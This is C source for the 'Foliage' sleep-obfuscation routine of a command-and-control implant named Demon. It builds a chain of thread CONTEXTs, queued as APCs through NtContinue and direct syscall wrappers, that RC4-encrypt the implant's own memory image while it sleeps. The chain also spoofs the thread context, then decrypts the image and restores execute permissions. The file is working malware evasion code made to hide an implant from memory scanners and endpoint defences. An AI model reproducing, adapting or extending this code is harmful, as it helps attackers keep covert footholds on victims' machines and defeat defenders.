#ifdef SLEEPOBF_USE_FOLIAGE

#include <Demon.h>

#include <common/Macros.h>
#include <core/SleepObf.h>
#include <core/Win32.h>
#include <core/MiniStd.h>
#include <core/Thread.h>

#include <rpcndr.h>
#include <ntstatus.h>

#if _WIN64

/*!
 * @brief
 *  foliage is a sleep obfuscation technique that is using APC calls
 *  to obfuscate itself in memory
 *
 * @param Param
 * @return
 */
VOID FoliageObf(
    IN PSLEEP_PARAM Param
) {
    USTRING             Key         = { 0 };
    USTRING             Rc4         = { 0 };
    UCHAR               Random[16]  = { 0 };

    HANDLE              hEvent      = NULL;
    HANDLE              hThread     = NULL;
    HANDLE              hDupObj     = NULL;

    /* All ROP CONTEXTs live in a single VirtualAlloc'd page block.
     * x64 CONTEXT embeds XMM register save area that requires 16-byte
     * alignment for NtGet/SetContextThread/NtContinue — LocalAlloc only
     * guarantees 8-byte alignment, which produced misaligned `movaps`
     * inside the kernel and crashed the APC thread.
     *
     * VirtualAlloc/NtAllocateVirtualMemory returns page-aligned memory
     * (at least 0x1000), and sizeof(CONTEXT) on x64 is 0x4D0 — a
     * multiple of 16 — so every carved slot is 16-byte aligned.
     * See BUG-FOL-2 in SleepObf-Analysis.md §8. */
    PVOID               RopBlock     = NULL;
    SIZE_T              RopBlockSize = 13 * sizeof( CONTEXT );

    // Rop Chain Thread Ctx
    PCONTEXT            RopInit     = NULL;
    PCONTEXT            RopCap      = NULL;
    PCONTEXT            RopSpoof    = NULL;

    PCONTEXT            RopBegin    = NULL;
    PCONTEXT            RopSetMemRw = NULL;
    PCONTEXT            RopMemEnc   = NULL;
    PCONTEXT            RopGetCtx   = NULL;
    PCONTEXT            RopSetCtx   = NULL;
    PCONTEXT            RopWaitObj  = NULL;
    PCONTEXT            RopMemDec   = NULL;
    PCONTEXT            RopSetMemRx = NULL;
    PCONTEXT            RopSetCtx2  = NULL;
    PCONTEXT            RopExitThd  = NULL;

    LPVOID              ImageBase   = NULL;
    SIZE_T              ImageSize   = 0;
    LPVOID              TxtBase     = NULL;
    SIZE_T              TxtSize     = 0;
    DWORD               dwProtect   = PAGE_EXECUTE_READWRITE;
    SIZE_T              TmpValue    = 0;

    ImageBase = Instance->Session.ModuleBase;
    ImageSize = Instance->Session.ModuleSize;

    // Check if .text section is defined
    if (Instance->Session.TxtBase != 0 && Instance->Session.TxtSize != 0) {
        TxtBase = Instance->Session.TxtBase;
        TxtSize = Instance->Session.TxtSize;
        dwProtect  = PAGE_EXECUTE_READ;
    } else {
        TxtBase = Instance->Session.ModuleBase;
        TxtSize = Instance->Session.ModuleSize;
    }

    // Generate random keys
    for ( SHORT i = 0; i < 16; i++ )
        Random[ i ] = RandomNumber32( );

    Key.Buffer = &Random;
    Key.Length = Key.MaximumLength = 0x10;

    Rc4.Buffer = ImageBase;
    Rc4.Length = Rc4.MaximumLength = ImageSize;

    if ( NT_SUCCESS( SysNtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) )
    {
        if ( NT_SUCCESS( SysNtCreateThreadEx( &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance->Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL ) ) )
        {
            /* Single page-aligned allocation for all 13 CONTEXTs.
             * Page alignment (0x1000) implies 16-byte alignment for the
             * block; carved slots stay aligned because sizeof(CONTEXT) is
             * a multiple of 16 on x64. */
            if ( ! NT_SUCCESS( SysNtAllocateVirtualMemory(
                    NtCurrentProcess(),
                    &RopBlock,
                    0,
                    &RopBlockSize,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE ) ) || ! RopBlock )
            {
                goto Leave;
            }

            MemSet( RopBlock, 0, RopBlockSize );

            RopInit     = (PCONTEXT) RopBlock;
            RopCap      = RopInit     + 1;
            RopSpoof    = RopCap      + 1;

            RopBegin    = RopSpoof    + 1;
            RopSetMemRw = RopBegin    + 1;
            RopMemEnc   = RopSetMemRw + 1;
            RopGetCtx   = RopMemEnc   + 1;
            RopSetCtx   = RopGetCtx   + 1;
            RopWaitObj  = RopSetCtx   + 1;
            RopMemDec   = RopWaitObj  + 1;
            RopSetMemRx = RopMemDec   + 1;
            RopSetCtx2  = RopSetMemRx + 1;
            RopExitThd  = RopSetCtx2  + 1;

            RopInit->ContextFlags       = CONTEXT_FULL;
            RopCap->ContextFlags        = CONTEXT_FULL;
            RopSpoof->ContextFlags      = CONTEXT_FULL;

            RopBegin->ContextFlags      = CONTEXT_FULL;
            RopSetMemRw->ContextFlags   = CONTEXT_FULL;
            RopMemEnc->ContextFlags     = CONTEXT_FULL;
            RopGetCtx->ContextFlags     = CONTEXT_FULL;
            RopSetCtx->ContextFlags     = CONTEXT_FULL;
            RopWaitObj->ContextFlags    = CONTEXT_FULL;
            RopMemDec->ContextFlags     = CONTEXT_FULL;
            RopSetMemRx->ContextFlags   = CONTEXT_FULL;
            RopSetCtx2->ContextFlags    = CONTEXT_FULL;
            RopExitThd->ContextFlags    = CONTEXT_FULL;

            if ( NT_SUCCESS( SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDupObj, THREAD_ALL_ACCESS, 0, 0 ) ) )
            {
                if ( NT_SUCCESS( Instance->Win32.NtGetContextThread( hThread, RopInit ) ) )
                {
                    MemCopy( RopBegin,    RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetMemRw, RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopMemEnc,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopGetCtx,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetCtx,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopWaitObj,  RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopMemDec,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetMemRx, RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetCtx2,  RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopExitThd,  RopInit, sizeof( CONTEXT ) );

                    RopBegin->ContextFlags = CONTEXT_FULL;
                    RopBegin->Rip  = U_PTR( Instance->Win32.NtWaitForSingleObject );
                    RopBegin->Rsp -= U_PTR( 0x1000 * 13 );
                    RopBegin->Rcx  = U_PTR( hEvent );
                    RopBegin->Rdx  = U_PTR( FALSE );
                    RopBegin->R8   = U_PTR( NULL );
                    *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtWaitForSingleObject( Evt, FALSE, NULL )

                    RopSetMemRw->ContextFlags = CONTEXT_FULL;
                    RopSetMemRw->Rip  = U_PTR( Instance->Win32.NtProtectVirtualMemory );
                    RopSetMemRw->Rsp -= U_PTR( 0x1000 * 12 );
                    RopSetMemRw->Rcx  = U_PTR( NtCurrentProcess() );
                    RopSetMemRw->Rdx  = U_PTR( &ImageBase );
                    RopSetMemRw->R8   = U_PTR( &ImageSize );
                    RopSetMemRw->R9   = U_PTR( PAGE_READWRITE );
                    *( PVOID* )( RopSetMemRw->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    *( PVOID* )( RopSetMemRw->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = C_PTR( &TmpValue );
                    // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_READWRITE, NULL,  );

                    RopMemEnc->ContextFlags = CONTEXT_FULL;
                    RopMemEnc->Rip  = U_PTR( Instance->Win32.SystemFunction032 );
                    RopMemEnc->Rsp -= U_PTR( 0x1000 * 11 );
                    RopMemEnc->Rcx  = U_PTR( &Rc4 );
                    RopMemEnc->Rdx  = U_PTR( &Key );
                    *( PVOID* )( RopMemEnc->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // SystemFunction032( &Rc4, &Key ); RC4 Encryption

                    RopGetCtx->ContextFlags = CONTEXT_FULL;
                    RopGetCtx->Rip  = U_PTR( Instance->Win32.NtGetContextThread );
                    RopGetCtx->Rsp -= U_PTR( 0x1000 * 10 );
                    RopGetCtx->Rcx  = U_PTR( hDupObj );
                    RopGetCtx->Rdx  = U_PTR( RopCap );
                    *( PVOID* )( RopGetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtGetContextThread( Src, Cap );

                    RopSetCtx->ContextFlags = CONTEXT_FULL;
                    RopSetCtx->Rip  = U_PTR( Instance->Win32.NtSetContextThread );
                    RopSetCtx->Rsp -= U_PTR( 0x1000 * 9 );
                    RopSetCtx->Rcx  = U_PTR( hDupObj );
                    RopSetCtx->Rdx  = U_PTR( RopSpoof );
                    *( PVOID* )( RopSetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtSetContextThread( Src, Spf );

                    // NOTE: Here is the thread sleeping...
                    RopWaitObj->ContextFlags = CONTEXT_FULL;
                    RopWaitObj->Rip  = U_PTR( Instance->Win32.WaitForSingleObjectEx );
                    RopWaitObj->Rsp -= U_PTR( 0x1000 * 8 );
                    RopWaitObj->Rcx  = U_PTR( hDupObj );
                    RopWaitObj->Rdx  = U_PTR( Param->TimeOut );
                    RopWaitObj->R8   = U_PTR( FALSE );
                    *( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // WaitForSingleObjectEx( Src, Fbr->Time, FALSE );

                    // NOTE: thread image decryption
                    RopMemDec->ContextFlags = CONTEXT_FULL;
                    RopMemDec->Rip  = U_PTR( Instance->Win32.SystemFunction032 );
                    RopMemDec->Rsp -= U_PTR( 0x1000 * 7 );
                    RopMemDec->Rcx  = U_PTR( &Rc4 );
                    RopMemDec->Rdx  = U_PTR( &Key );
                    *( PVOID* )( RopMemDec->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // SystemFunction032( &Rc4, &Key ); Rc4 Decryption

                    // RW -> RWX
                    RopSetMemRx->ContextFlags = CONTEXT_FULL;
                    RopSetMemRx->Rip  = U_PTR( Instance->Win32.NtProtectVirtualMemory );
                    RopSetMemRx->Rsp -= U_PTR( 0x1000 * 6 );
                    RopSetMemRx->Rcx  = U_PTR( NtCurrentProcess() );
                    RopSetMemRx->Rdx  = U_PTR( &TxtBase );
                    RopSetMemRx->R8   = U_PTR( &TxtSize );
                    RopSetMemRx->R9   = U_PTR( dwProtect );
                    *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = C_PTR( & TmpValue );
                    // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_EXECUTE_READ, & TmpValue );

                    RopSetCtx2->ContextFlags = CONTEXT_FULL;
                    RopSetCtx2->Rip  = U_PTR( Instance->Win32.NtSetContextThread );
                    RopSetCtx2->Rsp -= U_PTR( 0x1000 * 5 );
                    RopSetCtx2->Rcx  = U_PTR( hDupObj );
                    RopSetCtx2->Rdx  = U_PTR( RopCap );
                    *( PVOID* )( RopSetCtx2->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtSetContextThread( Src, Cap );

                    RopExitThd->ContextFlags = CONTEXT_FULL;
                    RopExitThd->Rip  = U_PTR( Instance->Win32.RtlExitUserThread );
                    RopExitThd->Rsp -= U_PTR( 0x1000 * 4 );
                    RopExitThd->Rcx  = U_PTR( ERROR_SUCCESS );
                    *( PVOID* )( RopExitThd->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // RtlExitUserThread( ERROR_SUCCESS );

                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopBegin,    FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetMemRw, FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopMemEnc,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopGetCtx,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetCtx,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopWaitObj,  FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopMemDec,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetMemRx, FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetCtx2,  FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopExitThd,  FALSE, NULL ) ) ) goto Leave;

                    if ( NT_SUCCESS( SysNtAlertResumeThread( hThread, NULL ) ) )
                    {
                        RopSpoof->ContextFlags = CONTEXT_FULL;
                        RopSpoof->Rip = U_PTR( Instance->Win32.WaitForSingleObjectEx );
                        RopSpoof->Rsp = U_PTR( Instance->Teb->NtTib.StackBase ); // TODO: try to spoof the stack and remove the pointers

                        // Execute every registered Apc thread
                        SysNtSignalAndWaitForSingleObject( hEvent, hThread, FALSE, NULL );
                    }
                }
            }

        }
    }

Leave:
    if ( hDupObj != NULL ) {
        SysNtClose( hDupObj );
        hDupObj = NULL;
    }

    if ( hThread != NULL ) {
        /* wait for the APC thread to fully exit before freeing CONTEXTs
         * that may still be referenced by pending APCs */
        SysNtWaitForSingleObject( hThread, FALSE, NULL );
        SysNtClose( hThread );
        hThread = NULL;
    }

    /* Free the CONTEXT block AFTER the APC thread has fully exited so
     * we never release memory a pending APC may still touch. */
    if ( RopBlock != NULL ) {
        SIZE_T FreeSize = 0;
        SysNtFreeVirtualMemory( NtCurrentProcess(), &RopBlock, &FreeSize, MEM_RELEASE );
        RopBlock    = NULL;
        RopInit     = NULL;
        RopCap      = NULL;
        RopSpoof    = NULL;
        RopBegin    = NULL;
        RopSetMemRw = NULL;
        RopMemEnc   = NULL;
        RopGetCtx   = NULL;
        RopSetCtx   = NULL;
        RopWaitObj  = NULL;
        RopMemDec   = NULL;
        RopSetMemRx = NULL;
        RopSetCtx2  = NULL;
        RopExitThd  = NULL;
    }

    if ( hEvent != NULL ) {
        SysNtClose( hEvent );
        hEvent = NULL;
    }

    MemSet( &Rc4, 0, sizeof( USTRING ) );
    MemSet( &Key, 0, sizeof( USTRING ) );
    MemSet( &Random, 0, 0x10 );

    Instance->Win32.SwitchToFiber( Param->Master );
}

#endif /* _WIN64 */

#endif /* SLEEPOBF_USE_FOLIAGE */
